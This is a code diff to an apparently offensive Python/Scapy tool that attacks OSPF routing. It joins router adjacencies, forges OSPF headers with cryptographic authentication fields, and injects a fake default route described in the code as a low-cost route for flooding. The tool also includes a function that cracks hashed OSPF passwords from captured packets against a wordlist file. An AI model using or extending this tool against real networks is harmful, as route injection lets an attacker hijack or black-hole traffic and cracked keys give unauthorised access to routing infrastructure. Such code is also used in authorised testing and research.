@@ -74,7 +74,7 @@ class OSPFConfig:
     
     # Auth details TODO: determine if should use hex/bytes/int
     authtype: int
-    plaintext_pw: str
+    plaintext_pw: str | None
     key_id: int
     authdata_len: int
     seq: int
@@ -296,7 +296,11 @@ self.config.area,
             # Step 5. update _send_ospf func with corresponding details
             self.config.key_id = getattr(ospf, "keyid", 1)
             self.config.authdata_len = getattr(ospf, "authdatalen", 0)
-            self.config.seq = getattr(ospf, "seq", 0)
+
+            if not hasattr(ospf, "seq"):
+                self.config.seq = int(time.time()) & 0xFFFFFFFF
+            else:
+                self.config.seq = (getattr(ospf, "seq", 0) + 1) & 0xFFFFFFFF
 
             # Crypto Authdata PW is the last 16 bytes of the packet
             # Convert raw packet to bytes and retrieve last 16 bytes to extract hashed pw
@@ -453,8 +457,8 @@ self.config.area,
             self.handle_exchange_dbd(nb, dbd_packet, flags)
 
         # Get full details of missing/outdated routes
-        if nb.state == NeighbourState.LOADING:
-            self.handle_loading_dbd(nb, dbd_packet, flags)
+        # if nb.state == NeighbourState.LOADING:
+        #     self.handle_loading_dbd(nb, dbd_packet, flags)
 
     def handle_exstart_dbd(self, nb: Neighbour, dbd_packet: OSPF_DBDesc, flags: DBDFlags) -> None:
         """Handler to establish master/slave relationship"""
@@ -585,9 +589,9 @@ self.config.area,
         nb.set_state(NeighbourState.FULL)
         LOG.info("Neighbour %s state set to FULL. Beginning route injection...", nb.router_id)
 
-        self.inject_low_cost_route(nb)
+        self.inject_low_cost_route()
 
-    def inject_low_cost_route(self, nb: Neighbour) -> None:
+    def inject_low_cost_route(self) -> None:
         """Construct and floods fake default route"""
         # Craft LSA to replicate `default-information originate always metric-type 1 metric 1` router command
         fake_route = OSPF_External_LSA(
@@ -779,22 +783,34 @@ self.config.area,
     def _send_ospf(self, dst_ip: str, dst_mac: str, ospf_type: int, payload: Any) -> None:
         """Sends OSPF Packets"""
         # TODO: implement authtype checker
-        if self.config.authtype == OSPFAuthType.NONE:
+        if self.config.authtype == OSPFAuthType.CRYPTO:
             ospf_hdr = OSPF_Hdr(
-                        version=2, # OSPF ver 2 for ipv4
-                        type=ospf_type,
-                        src=self.config.router_id,
-                        area=self.config.area,
-                        authtype=self.config.authtype,
-                        ) 
+                    version=2, # OSPF ver 2 for ipv4
+                    type=ospf_type,
+                    src=self.config.router_id,
+                    area=self.config.area,
+                    chksum=0,
+                    authtype=self.config.authtype,
+                    keyid=self.config.key_id,
+                    authdatalen=self.config.authdata_len,
+                    seq=self.config.seq,
+                    )
         elif self.config.authtype == OSPFAuthType.PLAINTEXT:
             ospf_hdr = OSPF_Hdr(
                     version=2,
                     type=ospf_type,
                     src=self.config.router_id,
                     area=self.config.area,
-                    authtype=self.config.authtype
+                    authtype=self.config.authtype,
                     )
+        else:
+            ospf_hdr = OSPF_Hdr(
+                        version=2,
+                        type=ospf_type,
+                        src=self.config.router_id,
+                        area=self.config.area,
+                        authtype=self.config.authtype,
+                        ) 
 
         pkt = (
                 Ether(src=self.src_mac, dst=dst_mac) /
@@ -805,7 +821,7 @@ self.config.area,
 
         sendp(pkt, iface=self.config.iface, verbose=False)
 
-    def crack_password(self, ospf_pkt: OSPF_Hdr, filename: str) -> str:
+    def crack_password(self, ospf_pkt: OSPF_Hdr, filename: str) -> str | None:
         """
         OSPF Authtype 2 - Hashed PW cracker
 
